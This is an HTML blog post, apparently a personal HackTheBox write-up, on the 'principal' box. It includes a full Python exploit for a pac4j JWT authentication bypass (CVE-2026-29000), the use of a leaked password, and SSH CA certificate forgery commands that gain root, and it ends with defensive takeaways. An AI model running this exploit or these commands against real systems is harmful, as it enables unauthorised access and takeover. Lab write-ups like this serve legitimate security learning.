@@ -1,0 +1,1076 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>principal - stxrless</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=DM+Mono:ital,wght@0,300;0,400;0,500;1,300;1,400&family=Instrument+Serif:ital@0;1&display=swap" rel="stylesheet">
+<style>
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+html { scroll-behavior: smooth; }
+
+:root {
+  --bg:    #08080f;
+  --ink:   #e8e4f0;
+  --dim:   #28253a;
+  --muted: #5a566e;
+  --serif: 'Instrument Serif', Georgia, serif;
+  --mono:  'DM Mono', monospace;
+  --col:   640px;
+}
+
+body {
+  background: var(--bg);
+  color: var(--ink);
+  font-family: var(--mono);
+  font-size: 13px;
+  font-weight: 300;
+  line-height: 1.6;
+  min-height: 100vh;
+  cursor: crosshair;
+}
+
+#stars {
+  position: fixed;
+  inset: 0;
+  pointer-events: none;
+  z-index: 0;
+}
+
+.site-header {
+  position: relative;
+  z-index: 10;
+  border-bottom: 1px solid var(--dim);
+  padding: 2.2rem 3rem 1.8rem;
+  display: flex;
+  align-items: flex-end;
+  justify-content: space-between;
+  gap: 2rem;
+}
+
+.brand {
+  display: flex;
+  flex-direction: column;
+  line-height: 1;
+  gap: 0.1rem;
+  text-decoration: none;
+}
+
+.brand-stxr {
+  font-family: var(--serif);
+  font-style: italic;
+  font-size: clamp(2.4rem, 5vw, 3.8rem);
+  letter-spacing: -0.03em;
+  color: var(--ink);
+  line-height: 0.9;
+}
+
+.brand-stxr .l { display: inline-block; }
+
+.brand-less {
+  font-family: var(--mono);
+  font-weight: 300;
+  font-size: clamp(0.75rem, 1.5vw, 1.1rem);
+  letter-spacing: 0.5em;
+  color: var(--muted);
+  opacity: 0.5;
+  -webkit-mask-image: linear-gradient(to right, rgba(0,0,0,1) 0%, rgba(0,0,0,0) 100%);
+  mask-image: linear-gradient(to right, rgba(0,0,0,1) 0%, rgba(0,0,0,0) 100%);
+}
+
+.back-link {
+  font-size: 0.65rem;
+  letter-spacing: 0.14em;
+  text-transform: uppercase;
+  color: var(--muted);
+  text-decoration: none;
+  transition: color 0.15s;
+  white-space: nowrap;
+  padding-bottom: 0.3rem;
+}
+
+.back-link:hover { color: var(--ink); }
+
+.article-wrap {
+  position: relative;
+  z-index: 2;
+  max-width: var(--col);
+  margin: 0 auto;
+  padding: 4rem 2rem 8rem;
+}
+
+.post-eyebrow {
+  display: flex;
+  align-items: center;
+  gap: 0.8rem;
+  margin-bottom: 1.6rem;
+  flex-wrap: wrap;
+}
+
+.tag {
+  font-size: 0.58rem;
+  letter-spacing: 0.1em;
+  text-transform: uppercase;
+  padding: 2px 8px;
+  border: 1px solid var(--dim);
+  border-radius: 1px;
+  color: var(--muted);
+  font-weight: 400;
+}
+
+.tag-ctf    { color: #8ab4ff; border-color: rgba(138,180,255,0.2); }
+.tag-web    { color: #72dfa8; border-color: rgba(114,223,168,0.2); }
+.tag-pwn    { color: #c98dff; border-color: rgba(201,141,255,0.2); }
+.tag-rev    { color: #f0c060; border-color: rgba(240,192,96,0.2);  }
+.tag-crypto { color: #ff8099; border-color: rgba(255,128,153,0.2); }
+.tag-misc   { color: var(--muted); }
+.tag-bug    { color: #ff8868; border-color: rgba(255,136,104,0.2); }
+
+.post-date {
+  font-size: 0.65rem;
+  letter-spacing: 0.08em;
+  color: var(--muted);
+}
+
+.post-event {
+  font-size: 0.65rem;
+  color: var(--muted);
+}
+
+.post-event strong {
+  color: var(--ink);
+  font-weight: 400;
+}
+
+.post-title {
+  font-family: var(--serif);
+  font-style: italic;
+  font-size: clamp(2rem, 5vw, 3rem);
+  line-height: 1.1;
+  letter-spacing: -0.02em;
+  color: var(--ink);
+  margin-bottom: 2.8rem;
+  padding-bottom: 2.4rem;
+  border-bottom: 1px solid var(--dim);
+}
+
+.article-wrap h2 {
+  font-family: var(--mono);
+  font-size: 0.65rem;
+  font-weight: 500;
+  letter-spacing: 0.22em;
+  text-transform: uppercase;
+  color: var(--muted);
+  margin: 3rem 0 1.2rem;
+  display: flex;
+  align-items: center;
+  gap: 0.7rem;
+}
+
+.article-wrap h2::before {
+  content: '//';
+  color: var(--dim);
+  font-weight: 300;
+  letter-spacing: 0.05em;
+  font-size: 0.7rem;
+}
+
+.article-wrap h3 {
+  font-family: var(--mono);
+  font-size: 0.72rem;
+  font-weight: 400;
+  letter-spacing: 0.1em;
+  color: var(--ink);
+  margin: 2rem 0 0.8rem;
+}
+
+.article-wrap p {
+  font-family: var(--serif);
+  font-size: 1.05rem;
+  line-height: 1.8;
+  color: rgba(232,228,240,0.72);
+  margin-bottom: 1.3rem;
+}
+
+.article-wrap h2 + p,
+.article-wrap h3 + p { margin-top: 0; }
+
+.article-wrap code {
+  font-family: var(--mono);
+  font-size: 0.8rem;
+  font-weight: 400;
+  color: #c98dff;
+  background: rgba(201,141,255,0.07);
+  border: 1px solid rgba(201,141,255,0.1);
+  border-radius: 2px;
+  padding: 1px 5px;
+}
+
+.article-wrap pre {
+  margin: 1.6rem 0;
+  border: 1px solid var(--dim);
+  border-left: 2px solid var(--muted);
+  background: rgba(255,255,255,0.02);
+  border-radius: 2px;
+  overflow-x: auto;
+}
+
+.article-wrap pre[data-file]::before {
+  content: attr(data-file);
+  display: block;
+  font-family: var(--mono);
+  font-size: 0.58rem;
+  letter-spacing: 0.14em;
+  text-transform: uppercase;
+  color: var(--dim);
+  padding: 0.6rem 1.2rem 0;
+  border-bottom: 1px solid var(--dim);
+  margin-bottom: 0.8rem;
+}
+
+.article-wrap pre code {
+  display: block;
+  font-size: 0.78rem;
+  font-weight: 300;
+  color: #c0bbcf;
+  background: none;
+  border: none;
+  padding: 1rem 1.2rem;
+  line-height: 1.75;
+}
+
+.article-wrap blockquote {
+  border-left: 2px solid #8ab4ff;
+  background: rgba(138,180,255,0.04);
+  padding: 0.9rem 1.2rem;
+  margin: 1.6rem 0;
+}
+
+.article-wrap blockquote p {
+  font-family: var(--mono);
+  font-size: 0.8rem;
+  color: rgba(138,180,255,0.9);
+  margin: 0;
+  line-height: 1.65;
+}
+
+.article-wrap ul {
+  list-style: none;
+  margin: 0.8rem 0 1.3rem;
+  display: flex;
+  flex-direction: column;
+  gap: 0.55rem;
+}
+
+.article-wrap ul li {
+  font-family: var(--serif);
+  font-size: 1.05rem;
+  line-height: 1.65;
+  color: rgba(232,228,240,0.72);
+  padding-left: 1.4rem;
+  position: relative;
+}
+
+.article-wrap ul li::before {
+  content: '-';
+  position: absolute;
+  left: 0;
+  color: var(--dim);
+  font-family: var(--mono);
+  font-size: 0.75rem;
+  top: 0.25rem;
+}
+
+.article-wrap ol {
+  list-style: none;
+  counter-reset: ol-counter;
+  margin: 0.8rem 0 1.3rem;
+  display: flex;
+  flex-direction: column;
+  gap: 0.55rem;
+}
+
+.article-wrap ol li {
+  font-family: var(--serif);
+  font-size: 1.05rem;
+  line-height: 1.65;
+  color: rgba(232,228,240,0.72);
+  padding-left: 1.8rem;
+  position: relative;
+  counter-increment: ol-counter;
+}
+
+.article-wrap ol li::before {
+  content: counter(ol-counter, decimal-leading-zero) '.';
+  position: absolute;
+  left: 0;
+  color: var(--muted);
+  font-family: var(--mono);
+  font-size: 0.65rem;
+  letter-spacing: 0.05em;
+  top: 0.3rem;
+}
+
+.article-wrap hr {
+  border: none;
+  border-top: 1px solid var(--dim);
+  margin: 3rem 0;
+}
+
+.flag {
+  display: flex;
+  align-items: center;
+  gap: 1.2rem;
+  border: 1px solid rgba(114,223,168,0.2);
+  border-left: 2px solid #72dfa8;
+  background: rgba(114,223,168,0.04);
+  padding: 1rem 1.4rem;
+  margin: 2.4rem 0;
+  border-radius: 1px;
+}
+
+.flag-label {
+  font-family: var(--mono);
+  font-size: 0.58rem;
+  letter-spacing: 0.18em;
+  text-transform: uppercase;
+  color: #72dfa8;
+  white-space: nowrap;
+  font-weight: 500;
+}
+
+.flag-value {
+  font-family: var(--mono);
+  font-size: 0.82rem;
+  color: var(--ink);
+  word-break: break-all;
+  letter-spacing: 0.02em;
+}
+
+.article-wrap img {
+  width: 100%;
+  border: 1px solid var(--dim);
+  border-radius: 2px;
+  margin: 1.6rem 0;
+  display: block;
+}
+
+.article-wrap table {
+  width: 100%;
+  border-collapse: collapse;
+  margin: 1.6rem 0;
+  font-family: var(--mono);
+  font-size: 0.75rem;
+}
+
+.article-wrap th {
+  text-align: left;
+  padding: 0.5rem 0.8rem;
+  font-size: 0.6rem;
+  letter-spacing: 0.14em;
+  text-transform: uppercase;
+  color: var(--muted);
+  border-bottom: 1px solid var(--dim);
+  font-weight: 400;
+}
+
+.article-wrap td {
+  padding: 0.6rem 0.8rem;
+  color: rgba(232,228,240,0.72);
+  border-bottom: 1px solid rgba(40,37,58,0.5);
+  vertical-align: top;
+  line-height: 1.6;
+}
+
+.article-wrap tr:last-child td { border-bottom: none; }
+
+/* ── CVE severity badge ── */
+.cve-badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 0.5rem;
+  padding: 0.3rem 0.8rem;
+  border: 1px solid rgba(255,88,104,0.3);
+  background: rgba(255,88,104,0.06);
+  border-radius: 2px;
+  font-family: var(--mono);
+  font-size: 0.68rem;
+  letter-spacing: 0.08em;
+  color: #ff8099;
+  margin: 0.4rem 0 1.2rem;
+}
+
+.cve-badge .score {
+  font-size: 0.62rem;
+  padding: 1px 5px;
+  background: rgba(255,88,104,0.18);
+  border-radius: 1px;
+  letter-spacing: 0.04em;
+}
+
+/* ── attack chain summary ── */
+.chain {
+  display: flex;
+  flex-direction: column;
+  gap: 0;
+  margin: 1.6rem 0;
+  position: relative;
+}
+
+.chain-step {
+  display: flex;
+  align-items: flex-start;
+  gap: 1rem;
+  padding: 0.8rem 0;
+  border-bottom: 1px solid var(--dim);
+}
+
+.chain-step:last-child { border-bottom: none; }
+
+.chain-n {
+  font-family: var(--mono);
+  font-size: 0.58rem;
+  color: var(--muted);
+  letter-spacing: 0.1em;
+  padding-top: 0.3rem;
+  min-width: 2.2rem;
+  flex-shrink: 0;
+}
+
+.chain-label {
+  font-family: var(--mono);
+  font-size: 0.72rem;
+  color: var(--ink);
+  font-weight: 400;
+  line-height: 1.5;
+}
+
+.chain-sub {
+  font-family: var(--mono);
+  font-size: 0.62rem;
+  color: var(--muted);
+  margin-top: 0.15rem;
+}
+
+/* ── post footer ── */
+.post-footer {
+  margin-top: 4rem;
+  padding-top: 2rem;
+  border-top: 1px solid var(--dim);
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 1rem;
+}
+
+.post-footer-left {
+  font-size: 0.65rem;
+  color: var(--muted);
+  letter-spacing: 0.06em;
+}
+
+.post-footer-right a {
+  font-size: 0.65rem;
+  letter-spacing: 0.12em;
+  text-transform: uppercase;
+  color: var(--muted);
+  text-decoration: none;
+  transition: color 0.15s;
+}
+
+.post-footer-right a:hover { color: var(--ink); }
+
+@media (max-width: 600px) {
+  .site-header { padding: 1.8rem 1.5rem 1.4rem; }
+  .article-wrap { padding: 2.5rem 1.5rem 5rem; }
+  .post-title { font-size: 1.8rem; }
+}
+
+::-webkit-scrollbar { width: 3px; }
+::-webkit-scrollbar-track { background: transparent; }
+::-webkit-scrollbar-thumb { background: var(--dim); }
+</style>
+</head>
+<body>
+
+<canvas id="stars"></canvas>
+
+<header class="site-header">
+  <a href="index.html" class="brand">
+    <div class="brand-stxr">
+      <span class="l">s</span><span class="l">t</span><span class="l">x</span><span class="l">r</span>
+    </div>
+    <div class="brand-less">less</div>
+  </a>
+  <a href="index.html" class="back-link">← all writeups</a>
+</header>
+
+<div class="article-wrap">
+
+  <div class="post-eyebrow">
+    <span class="tag tag-ctf">htb</span>
+    <span class="tag tag-web">web</span>
+    <span class="tag tag-pwn">privesc</span>
+    <span class="post-date">2026-03-24</span>
+    <span class="post-event">- <strong>HackTheBox · principal</strong></span>
+  </div>
+
+  <h1 class="post-title">
+    CVE-2026-29000 -> plaintext creds in API -> SSH CA forgery -> root
+  </h1>
+
+  <!-- ── overview ── -->
+  <h2>overview</h2>
+
+  <div class="cve-badge">
+    CVE-2026-29000
+    <span class="score">CVSS 10.0</span>
+    pac4j JWT auth bypass
+  </div>
+
+  <p>
+    The box runs a Java web application fronted by pac4j's JWT authenticator. A recent
+    critical vulnerability in the library allows an attacker to wrap a completely
+    unsigned <code>alg:none</code> JWT inside a valid JWE envelope, bypassing
+    signature verification entirely. From there the dashboard hands over an
+    encryption key and SSH CA path in plaintext - credentials that chain directly into
+    root via SSH certificate forgery.
+  </p>
+
+  <div class="chain">
+    <div class="chain-step">
+      <span class="chain-n">01.</span>
+      <div>
+        <div class="chain-label">nmap -> Jetty + pac4j-jwt header</div>
+        <div class="chain-sub">port 8080, X-Powered-By leaks the exact library</div>
+      </div>
+    </div>
+    <div class="chain-step">
+      <span class="chain-n">02.</span>
+      <div>
+        <div class="chain-label">app.js leaks full JWT/JWE spec + API endpoints</div>
+        <div class="chain-sub">token schema, role constants, JWKS endpoint - all in client-side JS</div>
+      </div>
+    </div>
+    <div class="chain-step">
+      <span class="chain-n">03.</span>
+      <div>
+        <div class="chain-label">CVE-2026-29000 - forge ROLE_ADMIN token, no creds needed</div>
+        <div class="chain-sub">PlainJWT inside JWE skips signature verification in vulnerable pac4j</div>
+      </div>
+    </div>
+    <div class="chain-step">
+      <span class="chain-n">04.</span>
+      <div>
+        <div class="chain-label">dashboard leaks SSH password in /api/settings</div>
+        <div class="chain-sub">encryption key stored as plaintext in the UI</div>
+      </div>
+    </div>
+    <div class="chain-step">
+      <span class="chain-n">05.</span>
+      <div>
+        <div class="chain-label">SSH in as svc-deploy -> user flag</div>
+        <div class="chain-sub">password from step 4, no further exploitation required</div>
+      </div>
+    </div>
+    <div class="chain-step">
+      <span class="chain-n">06.</span>
+      <div>
+        <div class="chain-label">readable SSH CA private key -> forge root certificate</div>
+        <div class="chain-sub">misconfigured file permissions let svc-deploy sign for any principal</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── recon ── -->
+  <h2>recon</h2>
+
+  <p>
+    Started with a comprehensive nmap scan - version detection, default scripts, and OS
+    fingerprinting all at once:
+  </p>
+
+  <pre data-file="scan"><code>sudo nmap -sS -sV -sC -O -oN nmap.txt $box</code></pre>
+
+  <p>
+    The flags in brief: <code>-sS</code> is a SYN scan (fast, stealthy, doesn't complete
+    the TCP handshake), <code>-sV</code> probes service banners for version strings,
+    <code>-sC</code> runs the default script set (grabs headers, checks common
+    misconfigs), <code>-O</code> attempts OS detection, and <code>-oN</code> writes
+    a clean log for later reference. Two ports come back open.
+  </p>
+
+  <table>
+    <thead>
+      <tr><th>port</th><th>service</th><th>detail</th></tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><code>22/tcp</code></td>
+        <td>ssh</td>
+        <td>OpenSSH 9.6p1 on Ubuntu</td>
+      </tr>
+      <tr>
+        <td><code>8080/tcp</code></td>
+        <td>http-proxy</td>
+        <td>Jetty - redirects to <code>/login</code></td>
+      </tr>
+    </tbody>
+  </table>
+
+  <p>
+    The response headers on port 8080 stopped me immediately. Buried in the <code>302</code>
+    redirect to <code>/login</code> was a single line:
+  </p>
+
+  <pre><code>X-Powered-By: pac4j-jwt/6.0.3</code></pre>
+
+  <blockquote>
+    <p>
+      a server advertising its exact auth library and version in a response header is,
+      charitably, a gift. CVE-2026-29000 is a CVSS 10.0 auth bypass in pac4j's JWT
+      authenticator. i had a hunch immediately, but wanted to map the full surface first.
+    </p>
+  </blockquote>
+
+  <h3>directory bruteforce</h3>
+
+  <p>
+    Default credentials (<code>admin:admin</code>, <code>admin:password</code>) went
+    nowhere on the login page, and the HTML itself had nothing interesting. Time for
+    gobuster:
+  </p>
+
+  <pre data-file="gobuster"><code>gobuster dir \
+  -u "http://$box:8080" \
+  -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt \
+  > gobuster.txt</code></pre>
+
+  <table>
+    <thead>
+      <tr><th>path</th><th>status</th><th>note</th></tr>
+    </thead>
+    <tbody>
+      <tr><td><code>/login</code></td><td>200</td><td>landing page</td></tr>
+      <tr><td><code>/dashboard</code></td><td>200</td><td>bounces to /login unauthenticated</td></tr>
+      <tr><td><code>/reset-password</code></td><td>501</td><td>not implemented</td></tr>
+      <tr><td><code>/error</code></td><td>500</td><td>verbose errors - noted</td></tr>
+      <tr><td><code>/WEB-INF</code></td><td>500</td><td>Java web archive structure visible</td></tr>
+    </tbody>
+  </table>
+
+  <p>
+    Nothing immediately exploitable - but the <code>/dashboard</code> redirect was
+    interesting. The server knows the route exists and returns a 200; it's client-side
+    auth enforcement. That told me the API was worth examining more closely, so I
+    pulled the page source.
+  </p>
+
+  <h2>client-side disclosure</h2>
+
+  <p>
+    The login page sources a single JS bundle at <code>/static/js/app.js</code>. What
+    I found inside was genuinely remarkable - the entire authentication architecture
+    documented in JSDoc comments, served publicly to any visitor:
+  </p>
+
+  <pre data-file="/static/js/app.js"><code>/**
+ * Principal Internal Platform - Client Application
+ *
+ * Authentication flow:
+ * 1. User submits credentials to /api/auth/login
+ * 2. Server returns encrypted JWT (JWE) token
+ * 3. Token is stored and sent as Bearer token for subsequent requests
+ *
+ * Token handling:
+ * - Tokens are JWE-encrypted using RSA-OAEP-256 + A128GCM
+ * - Public key available at /api/auth/jwks for token verification
+ * - Inner JWT is signed with RS256
+ *
+ * JWT claims schema:
+ *   sub   - username
+ *   role  - one of: ROLE_ADMIN, ROLE_MANAGER, ROLE_USER
+ *   iss   - "principal-platform"
+ *   iat   - issued at (epoch)
+ *   exp   - expiration (epoch)
+ */
+
+const JWKS_ENDPOINT    = '/api/auth/jwks';
+const AUTH_ENDPOINT    = '/api/auth/login';
+const DASHBOARD_ENDPOINT = '/api/dashboard';
+const USERS_ENDPOINT   = '/api/users';
+const SETTINGS_ENDPOINT = '/api/settings';
+
+const ROLES = {
+  ADMIN:   'ROLE_ADMIN',
+  MANAGER: 'ROLE_MANAGER',
+  USER:    'ROLE_USER'
+};</code></pre>
+
+  <p>
+    This is everything an attacker needs to forge a token: the JWE algorithm
+    (<code>RSA-OAEP-256 + A128GCM</code>), the public key endpoint (<code>/api/auth/jwks</code>),
+    the role claim names, and the full claims schema. Combined with a vulnerable version
+    of pac4j, this is a complete exploit blueprint handed over before a single login
+    attempt.
+  </p>
+
+  <blockquote>
+    <p>
+      leaving architecture documentation in client-side JS is a significant risk even when
+      there's no underlying vulnerability - paired with CVE-2026-29000 it becomes a
+      step-by-step attack guide.
+    </p>
+  </blockquote>
+
+  <h2>exploitation - CVE-2026-29000</h2>
+
+  <h3>how the vulnerability works</h3>
+
+  <p>
+    pac4j's <code>JwtAuthenticator</code> processes encrypted tokens in three stages:
+    decrypt the outer JWE, parse the inner payload, then verify the inner JWT's
+    signature. The bug lives in step three. After decryption, the library calls
+    <code>toSignedJWT()</code> on the payload to extract a <code>SignedJWT</code> for
+    verification. If the inner token is a <code>PlainJWT</code> - a JWT with
+    <code>"alg":"none"</code> and no signature - this method returns <code>null</code>.
+  </p>
+
+  <p>
+    The vulnerable logic then checks <code>if signedJWT is not None</code> before running
+    verification. Since it's null, the entire signature check is skipped. The library
+    moves on, extracts claims from the payload anyway, and creates a fully authenticated
+    session. An attacker only needs the server's public key to encrypt the outer JWE -
+    which is served openly at <code>/api/auth/jwks</code>.
+  </p>
+
+  <h3>the exploit</h3>
+
+  <pre data-file="exploit.py"><code>import argparse, requests, base64, json, time
+from jwcrypto import jwk, jwe
+
+
+def b64url(s):
+    return base64.urlsafe_b64encode(s.encode()).rstrip(b"=").decode()
+
+
+def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-t", "--target", required=True)
+    args = parser.parse_args()
+
+    # fetch server's public key - served openly, no auth required
+    jwks_url = f"{args.target}/api/auth/jwks"
+    key_data = requests.get(jwks_url).json()["keys"][0]
+    pub_key  = jwk.JWK(**key_data)
+
+    now = int(time.time())
+
+    # inner token: alg:none (PlainJWT) - no signature, verification skipped
+    header  = b64url('{"alg":"none"}')
+    payload = b64url(json.dumps({
+        "sub":  "admin",
+        "role": "ROLE_ADMIN",
+        "iss":  "principal-platform",
+        "iat":  now,
+        "exp":  now + 1337,
+    }))
+    plain_jwt = f"{header}.{payload}."   # empty signature segment
+
+    # outer JWE: encrypted with the server's own public key
+    token = jwe.JWE(
+        plain_jwt.encode(),
+        recipient=pub_key,
+        protected={
+            "alg": "RSA-OAEP-256",
+            "enc": "A128GCM",
+            "kid": key_data["kid"],
+        },
+    ).serialize(compact=True)
+
+    print(token)
+
+
+if __name__ == "__main__":
+    main()</code></pre>
+
+  <p>
+    Running the script against the target produces a valid JWE token encoding an admin
+    session - no credentials, no brute-force, no private key material. Drop it into
+    <code>sessionStorage</code> under the key <code>auth_token</code> and navigate to
+    <code>/dashboard</code>. The server accepts it without complaint.
+  </p>
+
+  <pre data-file="browser console"><code>sessionStorage.setItem('auth_token', '&lt;token from exploit.py&gt;')
+// navigate to /dashboard</code></pre>
+
+  <h2>post-auth recon</h2>
+
+  <h3>users</h3>
+
+  <p>
+    The Users panel lists a handful of accounts. One entry stands out immediately:
+    a service account named <code>svc-deploy</code> with the role <code>deployer</code>
+    and a note reading <em>"Service account for automated deployments via SSH certificate
+    auth."</em> Filed away - SSH cert auth is going to be relevant.
+  </p>
+
+  <h3>settings</h3>
+
+  <p>
+    The Settings panel is where things get loud. Under Security, a field labeled
+    <code>encryptionKey</code> contains a value that is unmistakably a password:
+  </p>
+
+  <pre data-file="/api/settings response (Security)"><code>encryptionKey    D3pl0y_$$H_Now42!
+tokenExpiry      3600s
+sessionManagement  stateless</code></pre>
+
+  <p>
+    And under Infrastructure, the SSH CA configuration is spelled out in full:
+  </p>
+
+  <pre data-file="/api/settings response (Infrastructure)"><code>sshCaPath       /opt/principal/ssh/
+sshCertAuth     enabled
+database        H2 (embedded)
+notes           SSH certificate auth configured for automation
+                - see /opt/principal/ssh/ for CA config.</code></pre>
+
+  <blockquote>
+    <p>
+      storing infrastructure secrets in an API endpoint that any authenticated user can
+      reach - including one whose session was forged without credentials - is the kind of
+      thing that turns a web vulnerability into a full system compromise.
+    </p>
+  </blockquote>
+
+  <h2>user flag</h2>
+
+  <p>
+    The <code>encryptionKey</code> value is almost certainly the password for
+    <code>svc-deploy</code>. One command confirms it:
+  </p>
+
+  <pre><code>sshpass -p 'D3pl0y_$$H_Now42!' ssh svc-deploy@$box</code></pre>
+
+  <pre><code>svc-deploy@principal:~$ ls
+user.txt</code></pre>
+
+  <div class="flag">
+    <span class="flag-label">user</span>
+    <span class="flag-value">user.txt</span>
+  </div>
+
+  <h2>privilege escalation</h2>
+
+  <h3>the SSH CA directory</h3>
+
+  <p>
+    The settings page pointed us to <code>/opt/principal/ssh/</code>. Let's see
+    what <code>svc-deploy</code> can actually read there:
+  </p>
+
+  <pre><code>svc-deploy@principal:/opt/principal/ssh$ ls -la
+
+drwxr-x--- 2 root deployers 4096 Mar 11 04:22 .
+drwxr-xr-x 5 root root      4096 Mar 11 04:22 ..
+-rw-r----- 1 root deployers  288 Mar  5 21:05 README.txt
+-rw-r----- 1 root deployers 3381 Mar  5 21:05 ca          ← private key
+-rw-r--r-- 1 root root       742 Mar  5 21:05 ca.pub</code></pre>
+
+  <p>
+    The CA private key is group-readable, and <code>svc-deploy</code> is in the
+    <code>deployers</code> group. This is the misconfiguration that ends the box -
+    the private key of a CA trusted by <code>sshd</code> should be accessible only
+    to root. With read access to it, we can sign any certificate for any principal,
+    including root.
+  </p>
+
+  <h3>forging the root certificate</h3>
+
+  <p>
+    Three commands from shell to root:
+  </p>
+
+  <pre data-file="privesc"><code># 1. generate a fresh keypair for ourselves
+ssh-keygen -t rsa -f /tmp/haxor -N ""
+
+# 2. sign our public key with the CA, claiming to be root
+#    -I  = certificate identity (label)
+#    -n  = principal (the account the cert is valid for)
+#    -V  = validity window
+ssh-keygen -s /opt/principal/ssh/ca \
+           -I "stxrless" \
+           -n root \
+           -V +1h \
+           /tmp/haxor.pub
+
+# 3. authenticate with the signed certificate
+ssh -i /tmp/haxor \
+    -o CertificateFile=/tmp/haxor-cert.pub \
+    root@localhost</code></pre>
+
+  <pre><code>root@principal:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@principal:~# cat root.txt</code></pre>
+
+  <div class="flag">
+    <span class="flag-label">root</span>
+    <span class="flag-value">root.txt</span>
+  </div>
+
+  <hr>
+
+  <h2>takeaways</h2>
+
+  <p>
+    Three independent failures stack here into a complete, credential-free root.
+    Any one of them fixed in isolation would have stopped the chain - but all three
+    have to coexist for the full compromise to land.
+  </p>
+
+  <ul>
+    <li>
+      <strong>Patch pac4j.</strong> CVE-2026-29000 is a CVSS 10.0 auth bypass with
+      public PoC. A library that accepts <code>alg:none</code> tokens wrapped in JWE
+      has no business sitting in front of a production service.
+    </li>
+    <li>
+      <strong>Strip implementation details from client-side code.</strong> Documenting
+      your JWT algorithm, claims schema, and API surface in a JS bundle served pre-auth
+      is not a vulnerability on its own - but it eliminates every guessing step for an
+      attacker who finds one.
+    </li>
+    <li>
+      <strong>Never store secrets in API responses.</strong> An encryption key
+      (read: password) visible in <code>/api/settings</code> to any authenticated user
+      - including a forged one - is not an encryption key. It's a footnote.
+    </li>
+    <li>
+      <strong>Lock down SSH CA private keys.</strong> A CA key readable by a service
+      account is a root certificate factory. The private key should be owner-root,
+      mode 600, full stop. Group-readable is the misconfiguration that turned
+      user into root in two commands.
+    </li>
+  </ul>
+
+  <div class="post-footer">
+    <span class="post-footer-left">stxrless · 2026</span>
+    <div class="post-footer-right">
+      <a href="index.html">← back to writeups</a>
+    </div>
+  </div>
+
+</div>
+
+<script>
+/* ── star field ── */
+const canvas = document.getElementById('stars');
+const ctx    = canvas.getContext('2d');
+
+function resize() {
+  canvas.width  = window.innerWidth;
+  canvas.height = window.innerHeight;
+}
+resize();
+window.addEventListener('resize', resize);
+
+const STAR_COUNT = 340;
+const stars = Array.from({ length: STAR_COUNT }, () => {
+  const side   = Math.random() < 0.5 ? 'left' : 'right';
+  const margin = 0.08 + Math.pow(Math.random(), 1.4) * 0.22;
+  return {
+    side, nx: margin,
+    ny:    0.02 + Math.random() * 0.96,
+    r:     Math.random() < 0.12 ? 1.0 + Math.random() * 0.9 : 0.25 + Math.random() * 0.6,
+    base:  0.08 + Math.random() * 0.55,
+    speed: 0.25 + Math.random() * 1.2,
+    phase: Math.random() * Math.PI * 2,
+    spike: Math.random() < 0.06,
+  };
+});
+
+function drawStars() {
+  const W = canvas.width, H = canvas.height;
+  ctx.clearRect(0, 0, W, H);
+
+  const colW  = Math.min(640, W);
+  const colL  = (W - colW) / 2;
+  const colR  = colL + colW;
+  const sideW = Math.max(colL, 1);
+  const t     = performance.now() / 1000;
+
+  for (const s of stars) {
+    const x = s.side === 'left'
+      ? s.nx * sideW
+      : colR + s.nx * sideW;
+    const y = s.ny * H;
+
+    const distFromArticle = s.side === 'left' ? colL - x : x - colR;
+    const edgeFade  = Math.min(1, distFromArticle / 40);
+    const outerFade = s.side === 'left'
+      ? Math.min(1, x / 30)
+      : Math.min(1, (W - x) / 30);
+
+    const twinkle = s.base + (1 - s.base) * 0.5 * (1 + Math.sin(t * s.speed + s.phase));
+    const alpha   = twinkle * Math.max(0, edgeFade) * outerFade;
+    if (alpha < 0.01) continue;
+
+    ctx.save();
+    ctx.globalAlpha = alpha;
+
+    if (s.spike) {
+      const rs = s.r;
+      ctx.fillStyle = '#ffffff';
+      ctx.beginPath();
+      for (let i = 0; i < 8; i++) {
+        const a   = (i / 8) * Math.PI * 2 - Math.PI / 2;
+        const len = i % 2 === 0 ? rs * 2.8 : rs * 0.9;
+        i === 0
+          ? ctx.moveTo(x + Math.cos(a) * len, y + Math.sin(a) * len)
+          : ctx.lineTo(x + Math.cos(a) * len, y + Math.sin(a) * len);
+      }
+      ctx.closePath();
+      ctx.fill();
+      const g = ctx.createRadialGradient(x, y, 0, x, y, rs * 6);
+      g.addColorStop(0, 'rgba(180,200,255,0.22)');
+      g.addColorStop(1, 'rgba(0,0,0,0)');
+      ctx.fillStyle = g;
+      ctx.beginPath();
+      ctx.arc(x, y, rs * 6, 0, Math.PI * 2);
+      ctx.fill();
+    } else {
+      const g = ctx.createRadialGradient(x, y, 0, x, y, s.r * 3.5);
+      g.addColorStop(0, 'rgba(210,220,255,0.9)');
+      g.addColorStop(0.4, 'rgba(160,180,255,0.3)');
+      g.addColorStop(1, 'rgba(0,0,0,0)');
+      ctx.fillStyle = g;
+      ctx.beginPath();
+      ctx.arc(x, y, s.r * 3.5, 0, Math.PI * 2);
+      ctx.fill();
+      ctx.fillStyle = '#dde4ff';
+      ctx.beginPath();
+      ctx.arc(x, y, s.r, 0, Math.PI * 2);
+      ctx.fill();
+    }
+    ctx.restore();
+  }
+}
+
+function loop() { drawStars(); requestAnimationFrame(loop); }
+loop();
+
+/* ── letter glow ── */
+document.querySelectorAll('.brand-stxr .l').forEach((l, i) => {
+  let phase = i * 1.3;
+  setInterval(() => {
+    phase += 0.04;
+    const bright = 0.3 + 0.7 * (0.5 + 0.5 * Math.sin(phase));
+    l.style.textShadow = `0 0 ${Math.round(bright * 18)}px rgba(180,200,255,${(bright * 0.3).toFixed(2)})`;
+  }, 50);
+});
+</script>
+</body>
+</html>
